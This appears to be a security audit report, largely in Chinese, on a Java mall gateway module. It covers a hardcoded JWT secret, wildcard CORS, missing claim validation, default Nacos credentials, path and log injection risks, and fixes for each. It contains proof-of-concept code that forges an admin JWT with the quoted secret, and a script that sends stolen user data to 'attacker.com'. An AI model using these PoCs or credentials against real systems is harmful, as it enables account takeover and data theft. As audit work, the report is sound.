# Security Research Result

## Verdict
**BLOCK** - 发现多个高风险安全漏洞，需要立即修复。

## Scope
- **Target**: mall-gateway 网关模块
- **Base/diff**: 当前工作树（未提交更改）
- **Commands run**: 文件读取、依赖分析、漏洞搜索

## Findings

| Severity | Title | CWE | Exploitability | Impact | PoC | Fix |
|----------|-------|-----|----------------|--------|-----|-----|
| HIGH | JWT 密钥硬编码 | CWE-798 | 高 | 完全绕过认证 | 可用 | 使用强随机密钥，从配置中心读取 |
| HIGH | 过于宽松的 CORS 配置 | CWE-942 | 高 | 跨站请求伪造，数据泄露 | 可用 | 限制允许的来源、方法和头 |
| MEDIUM | 缺少 JWT 声明验证 | CWE-345 | 中 | 使用其他服务的 JWT 访问 | 可用 | 验证 issuer、audience 等声明 |
| MEDIUM | Nacos 默认凭证 | CWE-798 | 中 | 配置中心被入侵 | 可用 | 更改默认凭证，使用强密码 |
| LOW | 路径遍历绕过风险 | CWE-22 | 低 | 绕过白名单认证 | 需验证 | 规范化路径，严格匹配 |
| LOW | 日志注入风险 | CWE-117 | 低 | 日志污染 | 需验证 | 清理日志输入 |

## Finding Details

### 1. JWT 密钥硬编码 (HIGH)

**Evidence**:
- `JwtUtil.java:39` - 默认密钥硬编码：`BeibuMallSecretKey2024!@#$%^&*()_+BeibuMallSecretKey2024`
- `application.yml:71` - 配置文件中的明文密钥

**Attack path**:
1. 攻击者从源代码或配置文件中获取默认密钥
2. 使用该密钥签发任意 JWT（如 admin 用户）
3. 使用伪造的 JWT 访问受保护的端点

**PoC**:
```java
String defaultSecret = "BeibuMallSecretKey2024!@#$%^&*()_+BeibuMallSecretKey2024";
SecretKey key = Keys.hmacShaKeyFor(defaultSecret.getBytes(StandardCharsets.UTF_8));

String token = Jwts.builder()
    .subject("admin")
    .claim("userId", 1L)
    .issuedAt(new Date())
    .expiration(new Date(System.currentTimeMillis() + 86400000))
    .signWith(key)
    .compact();
```

**Severity rationale**: 攻击者可以完全绕过认证，访问任意用户账户。

**Minimal fix**:
1. 移除硬编码默认值
2. 生成强随机密钥（至少 256 位）
3. 从 Nacos 配置中心或环境变量读取密钥
4. 确保网关和用户服务使用相同的密钥

**Regression check**: 测试无效密钥是否被拒绝。

### 2. 过于宽松的 CORS 配置 (HIGH)

**Evidence**:
- `CorsConfig.java:43` - `addAllowedOriginPattern("*")`
- `CorsConfig.java:51` - `addAllowedMethod("*")`
- `CorsConfig.java:57` - `addAllowedHeader("*")`
- `CorsConfig.java:61` - `setAllowCredentials(true)`

**Attack path**:
1. 攻击者创建恶意网站
2. 该网站向网关发送带凭证的跨域请求
3. 浏览器允许请求，因为 CORS 配置过于宽松
4. 攻击者窃取用户数据或执行操作

**PoC**:
```html
<script>
fetch('http://gateway:9000/api/user/info', {
    method: 'GET',
    credentials: 'include',
    headers: { 'Authorization': 'Bearer <token>' }
}).then(r => r.json()).then(data => {
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
```

**Severity rationale**: 完全破坏 CORS 安全机制，允许任意网站发起带凭证的请求。

**Minimal fix**:
1. 将 `addAllowedOriginPattern("*")` 替换为具体的前端域名
2. 限制允许的 HTTP 方法（GET、POST、PUT、DELETE）
3. 限制允许的请求头（Authorization、Content-Type）
4. 考虑是否需要 `setAllowCredentials(true)`

**Regression check**: 测试来自非允许来源的请求是否被拒绝。

### 3. 缺少 JWT 声明验证 (MEDIUM)

**Evidence**:
- `JwtUtil.java:61-65` - 只验证签名和过期时间，不验证 issuer、audience 等声明

**Attack path**:
1. 攻击者获取其他服务签发的 JWT（使用相同密钥）
2. 该 JWT 的 issuer 与当前服务不同
3. 网关仍然接受该 JWT

**PoC**:
```java
String token = Jwts.builder()
    .subject("admin")
    .claim("userId", 1L)
    .issuer("other-service") // 不同的 issuer
    .issuedAt(new Date())
    .expiration(new Date(System.currentTimeMillis() + 86400000))
    .signWith(key)
    .compact();
```

**Severity rationale**: 允许使用其他服务的 JWT，增加了攻击面。

**Minimal fix**:
1. 在 `parseToken` 方法中添加 issuer 验证
2. 从配置文件读取预期的 issuer
3. 验证 audience（如果适用）

**Regression check**: 测试不同 issuer 的 JWT 是否被拒绝。

### 4. Nacos 默认凭证 (MEDIUM)

**Evidence**:
- `application.yml:10-11` - `username: nacos` 和 `password: nacos`

**Attack path**:
1. 攻击者访问 Nacos 控制台（默认端口 8848）
2. 使用默认凭证 nacos/nacos 登录
3. 修改网关配置，添加恶意路由或禁用认证
4. 劫持所有微服务流量

**Severity rationale**: 配置中心被入侵可能导致整个系统被控制。

**Minimal fix**:
1. 更改 Nacos 默认密码
2. 使用强密码（至少 16 位，包含大小写字母、数字、特殊字符）
3. 限制 Nacos 控制台的访问来源
4. 启用 Nacos 的认证和授权

**Regression check**: 测试默认凭证是否被拒绝。

### 5. 路径遍历绕过风险 (LOW)

**Evidence**:
- `AuthGlobalFilter.java:112-118` - 使用 AntPathMatcher 进行路径匹配
- `application.yml:77-90` - 白名单路径配置

**Attack path**:
1. 攻击者构造特殊路径，如 `/api/user/login/` 或 `/api/user/./login`
2. 这些路径可能绕过白名单匹配
3. 但 AntPathMatcher 通常能正确处理这些情况

**Severity rationale**: 风险较低，因为 AntPathMatcher 通常能正确处理路径规范化。

**Minimal fix**:
1. 在匹配前对路径进行规范化
2. 使用严格的路径匹配模式
3. 添加测试用例验证路径遍历

**Regression check**: 测试各种路径遍历变体是否被正确处理。

### 6. 日志注入风险 (LOW)

**Evidence**:
- `AuthGlobalFilter.java:100` - 记录用户ID和用户名

**Attack path**:
1. 攻击者在 JWT 中注入恶意内容（如换行符）
2. 这些内容被记录到日志中
3. 可能污染日志或触发日志处理系统的漏洞

**Severity rationale**: 风险较低，但需要清理输入。

**Minimal fix**:
1. 清理日志输入，移除换行符和控制字符
2. 使用参数化日志记录
3. 限制日志字段长度

**Regression check**: 测试包含恶意字符的 JWT 是否被正确处理。

## Downgraded or Rejected Candidates

| Candidate | Reason |
|-----------|--------|
| 弱密钥 | 密钥长度足够（64字符），但可预测。降级为配置问题。 |
| 依赖漏洞 (CVE-2024-31033) | 供应商争议该漏洞，且 0.12.6 是最新版本。降级为监控项。 |
| 路径遍历绕过 | AntPathMatcher 通常能正确处理。降级为低风险。 |
| 日志注入 | 风险较低，但建议修复。降级为低风险。 |

## Residual Risk

1.  **未测试运行时行为**: 由于没有运行环境，无法测试实际的攻击路径。
2.  **未测试依赖漏洞**: 需要实际运行环境来验证 CVE-2024-31033 的影响。
3.  **未测试路径遍历**: 需要实际发送请求来验证路径遍历绕过。
4.  **未测试日志注入**: 需要实际运行环境来验证日志注入。

## 安全建议

### 立即修复（高优先级）

1.  **JWT 密钥管理**:
    - 生成强随机密钥（至少 256 位）
    - 从 Nacos 配置中心或环境变量读取
    - 确保网关和用户服务使用相同的密钥
    - 定期轮换密钥

2.  **CORS 配置**:
    - 限制允许的来源（如 `https://www.beibumall.com`）
    - 限制允许的 HTTP 方法
    - 限制允许的请求头
    - 考虑是否需要凭证支持

3.  **Nacos 安全**:
    - 更改默认密码
    - 使用强密码
    - 限制访问来源
    - 启用认证和授权

### 中期改进（中优先级）

1.  **JWT 声明验证**:
    - 验证 issuer
    - 验证 audience（如果适用）
    - 验证签发时间

2.  **路径规范化**:
    - 在匹配前规范化路径
    - 添加路径遍历测试用例

3.  **日志安全**:
    - 清理日志输入
    - 使用参数化日志记录

### 长期改进（低优先级）

1.  **依赖管理**:
    - 定期更新依赖版本
    - 监控安全公告

2.  **安全测试**:
    - 添加安全测试用例
    - 进行定期安全审计

## 附录：相关文件

- `JwtUtil.java` - JWT 工具类
- `AuthGlobalFilter.java` - 认证过滤器
- `CorsConfig.java` - 跨域配置
- `WhiteListConfig.java` - 白名单配置
- `application.yml` - 配置文件
- `pom.xml` - 依赖配置